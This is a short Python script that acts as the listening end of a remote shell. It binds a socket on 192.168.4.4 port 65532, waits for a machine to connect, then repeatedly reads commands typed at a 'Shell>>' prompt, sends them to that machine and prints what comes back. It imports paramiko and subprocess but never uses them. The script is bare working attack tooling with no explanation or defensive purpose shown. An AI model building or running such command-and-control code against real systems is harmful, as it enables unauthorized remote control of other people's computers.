import socket
import os, paramiko
import sys, subprocess
host="192.168.4.4"
port=65532
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
server.bind((host,port))
server.listen()
conn,addr=server.accept()
print('[+]Connected to',addr)
while True:
	command=input("Shell>>")
	if command=='exit':
		print("Connection is closed!!!")
		conn.send(b'exit')
		conn.close()
		break
	else:
		conn.send(command.encode())
		output=conn.recv(1024)
		print(output.decode())
